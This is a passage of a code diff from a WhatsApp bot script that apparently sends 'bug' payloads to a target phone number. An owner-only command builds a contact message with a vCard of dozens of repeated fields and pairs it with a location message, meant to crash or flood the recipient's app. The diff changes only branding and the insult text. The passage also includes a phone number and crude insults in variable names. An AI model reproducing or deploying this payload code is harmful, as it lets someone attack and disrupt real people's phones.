karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: jobotz.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 						"degreesLatitude": -6.936928157735237,
 						"degreesLongitude": 107.72270679473877,
-						"caption": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+						"caption": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 						"jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: kontolfariz })
@@ -7496,15 +7561,15 @@ await m.reply(`Berhasil Mengirim Bugloc Di Nomer ${text}`)
 }
 break
 case 'kibuglocto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: jobotz.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 						"degreesLatitude": -6.936928157735237,
 						"degreesLongitude": 107.72270679473877,
-						"caption": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+						"caption": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 						"jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: kontolfariz })
